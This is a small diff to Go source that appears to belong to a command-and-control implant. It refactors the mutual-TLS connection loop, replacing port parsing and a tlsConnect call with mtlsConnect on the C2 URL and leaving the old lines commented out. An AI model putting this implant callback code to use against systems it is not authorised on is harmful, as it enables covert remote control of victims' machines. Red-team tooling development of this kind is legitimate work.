@@ -33,7 +33,7 @@ import (
 	"time"
 
 	// {{if .Config.MTLSc2Enabled}}
-	"strconv"
+
 	// {{end}}
 
 	"github.com/golang/protobuf/proto"
@@ -101,14 +101,16 @@ ConnLoop:
 			// {{if .Config.Debug}}
 			log.Printf("Connecting -> %s", t.URL.Host)
 			// {{end}}
-			lport, err := strconv.Atoi(t.URL.Port())
-			if err != nil {
-				// {{if .Config.Debug}}
-				log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
-				// {{end}}
-				lport = 8888
-			}
-			t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
+
+			// lport, err := strconv.Atoi(t.URL.Port())
+			// if err != nil {
+			//         // {{if .Config.Debug}}
+			//         log.Printf("[mtls] Error: failed to parse url.Port%s", t.URL.Host)
+			//         // {{end}}
+			//         lport = 8888
+			// }
+			t.C2, err = mtlsConnect(t.URL)
+			// t.Conn, err = tlsConnect(t.URL.Hostname(), uint16(lport))
 			if err != nil {
 				// {{if .Config.Debug}}
 				log.Printf("[mtls] Connection failed: %s", err)
